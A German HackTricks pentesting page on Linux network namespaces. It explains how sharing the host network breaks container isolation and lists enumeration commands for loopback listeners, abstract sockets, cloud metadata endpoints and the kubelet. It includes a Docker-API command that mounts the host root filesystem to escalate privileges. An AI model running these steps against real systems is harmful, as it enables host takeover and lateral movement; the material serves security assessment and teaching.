# Netzwerk-Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Überblick

Der Netzwerk-Namespace isoliert netzwerkbezogene Ressourcen wie Interfaces, IP-Adressen, Routing-Tabellen, ARP-/Nachbarstatus, Firewall-Regeln, Sockets, den abstrakten UNIX-Domain-Socket-Namespace sowie den Inhalt von Dateien wie `/proc/net`. Deshalb kann ein Container ein eigenes `eth0`, eigene lokale Routen und ein eigenes Loopback-Device haben, ohne den tatsächlichen Netzwerk-Stack des Hosts zu besitzen.

Aus Sicherheitssicht ist dies wichtig, weil Netzwerkisolation weit mehr als nur das Binden von Ports umfasst. Ein privater Netzwerk-Namespace beschränkt, was die Workload direkt beobachten oder neu konfigurieren kann. Sobald dieser Namespace mit dem Host geteilt wird, kann der Container plötzlich Einblick in Listener des Hosts, hostlokale Services, abstrakte AF_UNIX-Endpunkte und Netzwerk-Kontrollpunkte erhalten, die niemals für die Anwendung zugänglich sein sollten.

## Funktionsweise

Ein neu erstellter Netzwerk-Namespace beginnt mit einer leeren oder nahezu leeren Netzwerkumgebung, bis Interfaces mit ihm verbunden werden. Container-Runtimes erstellen oder verbinden anschließend virtuelle Interfaces, weisen Adressen zu und konfigurieren Routen, damit die Workload die erwartete Konnektivität erhält. In bridge-basierten Deployments sieht der Container normalerweise ein von einem veth unterstütztes Interface, das mit einer Host-Bridge verbunden ist. In Kubernetes übernehmen CNI-Plugins die entsprechende Einrichtung für das Pod-Networking.

Diese Architektur erklärt, warum `--network=host` oder `hostNetwork: true` eine so gravierende Änderung darstellt. Anstatt einen vorbereiteten privaten Netzwerk-Stack zu erhalten, tritt die Workload dem tatsächlichen Netzwerk-Stack des Hosts bei.

## Lab

Mit folgendem Befehl kannst du einen nahezu leeren Netzwerk-Namespace sehen:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Und Sie können normale Container und Container mit Host-Netzwerk vergleichen mit:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Der Container mit Host-Netzwerk verfügt nicht mehr über eine eigene isolierte Ansicht von Sockets und Schnittstellen. Diese Änderung allein ist bereits erheblich, bevor man überhaupt prüft, über welche Capabilities der Prozess verfügt.

## Runtime-Nutzung

Docker und Podman erstellen normalerweise einen privaten Network Namespace für jeden Container, sofern nichts anderes konfiguriert wurde. Kubernetes weist jedem Pod normalerweise einen eigenen Network Namespace zu, der von den Containern innerhalb dieses Pods gemeinsam genutzt wird, aber vom Host getrennt ist. Das bedeutet, dass `127.0.0.1` normalerweise auf Pod-Ebene statt auf Container-Ebene gilt: Ein Listener, der ausschließlich an localhost gebunden ist, ist typischerweise von seinen Sidecars und Geschwistern aus erreichbar. Incus/LXC-Systeme bieten ebenfalls eine umfangreiche Isolation auf Basis von Network Namespaces, häufig mit einer größeren Vielfalt virtueller Networking-Konfigurationen.

Das gemeinsame Prinzip besteht darin, dass privates Networking standardmäßig die Isolationsgrenze bildet, während Host-Networking eine ausdrückliche Umgehung dieser Grenze darstellt.

## Fehlkonfigurationen

Die wichtigste Fehlkonfiguration ist schlicht das Teilen des Network Namespace des Hosts. Dies wird manchmal aus Performancegründen, für Low-Level-Monitoring oder aus Bequemlichkeit gemacht, entfernt jedoch eine der klarsten verfügbaren Grenzen für Container. Auf dem Host laufende Listener werden auf direkterem Weg erreichbar, ausschließlich an localhost gebundene Services können zugänglich werden, und Capabilities wie `CAP_NET_ADMIN` oder `CAP_NET_RAW` werden deutlich gefährlicher, weil die von ihnen ermöglichten Operationen nun auf die eigene Netzwerkumgebung des Hosts angewendet werden.

Ein weiteres Problem ist die übermäßige Vergabe von netzwerkbezogenen Capabilities, selbst wenn der Network Namespace privat ist. Ein privater Namespace bietet zwar Schutz, macht Raw Sockets oder erweiterte Netzwerkkontrolle jedoch nicht harmlos.

In Kubernetes verändert `hostNetwork: true` außerdem, wie viel Vertrauen man in die Netzwerksegmentierung auf Pod-Ebene setzen kann. Kubernetes dokumentiert, dass viele Network Plugins den Traffic von `hostNetwork`-Pods bei der Zuordnung über `podSelector` / `namespaceSelector` nicht korrekt unterscheiden können und ihn daher als gewöhnlichen Node-Traffic behandeln. Aus Sicht eines Angreifers bedeutet das, dass eine kompromittierte `hostNetwork`-Workload häufig eher als Netzwerkzugang auf Node-Ebene betrachtet werden sollte und nicht als normaler Pod, der weiterhin denselben Policy-Annahmen unterliegt wie Workloads in einem Overlay-Network.

## Missbrauch

In schwach isolierten Setups können Angreifer die auf dem Host laufenden Services untersuchen, Management-Endpunkte erreichen, die ausschließlich an die Loopback-Schnittstelle gebunden sind, abhängig von den genauen Capabilities und der Umgebung Traffic sniffen oder beeinflussen oder Routing- und Firewall-Zustände neu konfigurieren, sofern `CAP_NET_ADMIN` vorhanden ist. In einem Cluster kann dies außerdem laterale Bewegungen und die Aufklärung der Control Plane erleichtern.

Wenn du Host-Networking vermutest, solltest du zunächst bestätigen, dass die sichtbaren Schnittstellen und Listener zum Host und nicht zu einem isolierten Container-Netzwerk gehören:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Dienste, die nur über Loopback erreichbar sind, sind oft die erste interessante Entdeckung:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Abstrakte UNIX-Sockets sind ein weiteres leicht zu übersehendes Ziel, da sie auf den Netzwerk-Namespace beschränkt sind, obwohl sie weder wie TCP/UDP-Listener aussehen noch als Dateisystempfade unter `/run` vorhanden sein müssen. Ein Container mit Host-Netzwerk kann dadurch Zugriff auf nur auf dem Host vorhandene Steuerkanäle erben, die überhaupt nicht in den Container eingebunden wurden:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Ein historisches Beispiel war der Fehler bei der Offenlegung des abstrakten Sockets von `containerd-shim`. Die umfassendere Erkenntnis ist jedoch wichtiger als die spezifische CVE: Sobald ein Workload dem Netzwerk-Namespace des Hosts beitritt, gehören auch abstrakte AF_UNIX-Dienste zur Angriffsfläche. Wenn diese Sockets laufzeitbezogen oder administrativ wirken, wechsle zu [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md).

Wenn Netzwerk-Capabilities vorhanden sind, prüfe, ob der Workload den sichtbaren Stack untersuchen oder verändern kann:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Auf modernen Kernels kann Host-Networking zusammen mit `CAP_NET_ADMIN` auch den Paketpfad über einfache Änderungen an `iptables` / `nftables` hinaus offenlegen. `tc`-qdiscs und Filter sind ebenfalls namespace-spezifisch und gelten daher in einem gemeinsam genutzten Host-Network-Namespace für die Host-Schnittstellen, die der Container sehen kann. Wenn zusätzlich `CAP_BPF` vorhanden ist, werden auch netzwerkbezogene eBPF-Programme wie TC- und XDP-Loader relevant:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Dies ist relevant, weil ein Angreifer möglicherweise Datenverkehr auf Ebene des Host-Interfaces spiegeln, umleiten, formen oder verwerfen kann und nicht nur Firewall-Regeln umschreiben kann. In einem privaten Netzwerk-Namespace sind diese Aktionen auf die Sicht des Containers beschränkt; in einem gemeinsam genutzten Host-Namespace wirken sie sich auf den Host aus.

In Cluster- oder Cloud-Umgebungen rechtfertigt Host-Netzwerk außerdem eine schnelle lokale recon von Metadaten und an die Control Plane angrenzenden Diensten:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
In Kubernetes gilt: Wenn ein **beliebiger** Container in einem Pod mit mehreren Containern kompromittiert wird, erhält man auch Zugriff auf die von benachbarten Containern und Sidecars geöffneten localhost-Listener, da der gesamte Pod einen gemeinsamen Netzwerk-Namespace verwendet. Dies ist besonders bei Service-Mesh-, Observability- und Hilfscontainern relevant, deren Admin- oder Debug-Schnittstellen absichtlich nur innerhalb des Pods und nicht clusterweit erreichbar sind:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
„An localhost gebunden“ bedeutet **Pod-private**, nicht **container-private**. Sobald ein Container im Pod kompromittiert wurde, ist diese Annahme hinfällig.

### Vollständiges Beispiel: Host-Networking + Zugriff auf lokale Runtime / Kubelet

Host-Networking bietet nicht automatisch Root-Rechte auf dem Host, legt jedoch häufig Services offen, die absichtlich nur vom Node selbst erreichbar sein sollen. Wenn einer dieser Services nur unzureichend geschützt ist, wird Host-Networking zu einem direkten Pfad zur Privilegieneskalation.

Docker API auf localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet auf localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Auswirkungen:

- direkter Host-Kompromittierung, wenn eine lokale Runtime-API ohne angemessenen Schutz offengelegt ist
- Cluster-Aufklärung oder laterale Bewegung, wenn kubelet oder lokale Agents erreichbar sind
- Manipulation des Datenverkehrs oder Denial of Service in Kombination mit `CAP_NET_ADMIN`

## Prüfungen

Ziel dieser Prüfungen ist festzustellen, ob der Prozess über einen privaten Netzwerk-Stack verfügt, welche Routen und Listener sichtbar sind und ob die Netzwerkansicht bereits wie die des Hosts wirkt, bevor du überhaupt Capabilities testest.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Was hier interessant ist:

- Wenn `/proc/self/ns/net` und `/proc/1/ns/net` bereits wie auf dem Host aussehen, verwendet der Container möglicherweise den Netzwerk-Namespace des Hosts oder einen anderen nicht privaten Namespace.
- `lsns -t net` und `ip netns identify` sind nützlich, wenn sich die Shell bereits innerhalb eines benannten oder persistenten Namespace befindet und du ihn mit den `/run/netns`-Objekten von der Host-Seite aus in Beziehung setzen möchtest.
- `ss -lntup` ist besonders wertvoll, da es ausschließlich an Loopback gebundene Listener und lokale Management-Endpunkte sichtbar macht. `ss -xap` und `/proc/net/unix` ergänzen die Ansicht abstrakter Sockets, die bei der Suche nach gewöhnlichen Datei-Sockets übersehen werden.
- Routen, Interface-Namen, Firewall-Kontext, der `tc`-Status und eBPF-Anbindungen werden deutlich wichtiger, wenn `CAP_NET_ADMIN`, `CAP_NET_RAW` oder `CAP_BPF` vorhanden ist.
- In Kubernetes kann eine fehlgeschlagene Service-Namensauflösung aus einem `hostNetwork`-Pod einfach bedeuten, dass der Pod nicht `dnsPolicy: ClusterFirstWithHostNet` verwendet, und nicht, dass der Service fehlt.
- In Pods mit mehreren Containern gehören Listener auf localhost zum gesamten Netzwerk-Namespace des Pods. Prüfe daher Sidecars und benachbarte Container, bevor du annimmst, dass ein ausschließlich an Loopback gebundener Port vom kompromittierten Container aus nicht erreichbar ist.

Bei der Untersuchung eines Containers solltest du den Netzwerk-Namespace immer zusammen mit dem Capability-Satz bewerten. Host-Networking plus weitreichende Netzwerk-Capabilities stellt eine völlig andere Sicherheitslage dar als Bridge-Networking plus ein eingeschränkter Standard-Capability-Satz.

## Referenzen

- [Kubernetes NetworkPolicy und `hostNetwork`-Fallstricke](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [Linux `network_namespaces(7)` und die Isolation abstrakter UNIX-Sockets](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [containerd-Hinweis: abstrakte Unix-Domain-Sockets, die für Host-Network-Container zugänglich sind](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [Anforderungen an eBPF-Token und Capabilities für netzwerkbezogene eBPF-Programme](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
